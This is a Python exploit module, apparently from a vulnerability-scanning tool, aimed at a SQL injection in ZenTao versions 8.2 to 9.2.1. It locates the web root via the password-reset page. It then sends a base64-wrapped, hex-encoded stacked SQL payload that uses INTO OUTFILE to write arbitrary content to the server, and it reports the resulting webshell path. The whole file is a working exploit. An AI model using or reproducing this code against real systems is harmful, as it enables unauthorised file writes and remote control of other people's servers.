# -*- coding:utf-8 -*-
# 禅道 V8.2-9.2.1 sql注入
import base64
import re

from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .zentao_sql_poc import POC
import binascii

from ..requestClass import Requests

payload = '{"orderBy":"order limit 1;SET @SQL=0x{sql};PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}'
origin_sql = "select '{content}' into outfile '{zentao_path}/{filename}'"







class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def get_path(self, url):
        def test(pwd_path):
            print(url + pwd_path)
            resp = self.requestUtil.get(url + pwd_path)
            print(resp.text)
            abs_path = re.findall("创建(.*?)文件", resp.text)[0].replace("<span>", "").replace("</span>", "").replace("'",
                                                                                                                  "").strip()
            if "tmp" in abs_path:
                return abs_path.split("tmp")[0] + "/www/"
            elif "www" in abs_path:
                return abs_path.split("www")[0] + "/www/"

        try:
            return test("/user-reset.html")
        except Exception as e:
            print(e)
            resp = self.requestUtil.get(url + "index.php?m=user&f=login")
            print(resp.text)
            pwd_path = re.findall("a href='(.*?)'.*?忘记密码", resp.text)[0]
            return test(pwd_path)

    def upload_file(self, url, zentao_path, filename, content):
        hex_sql = binascii.hexlify(
            origin_sql.format(content=content, zentao_path=zentao_path, filename=filename).encode()).decode()
        upload_payload = payload.replace("{sql}", hex_sql)
        b64_payload = base64.b64encode(upload_payload.encode()).decode()
        resp = self.requestUtil.get(url + f"?m=block&f=main&mode=getblockdata&blockid=case&param={b64_payload}",
                                    header={
                                        "Referer": url
                                    })
        resp = self.requestUtil.get(url + filename)
        if not "ERROR" in resp.text:
            return True

    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        url = self.vuln.url + self.vuln.specify
        zentao_path = self.get_path(url)
        if self.upload_file(url, zentao_path, cmd, content):
            return f"文件上传成功, shell路径:\n{url}{cmd}"
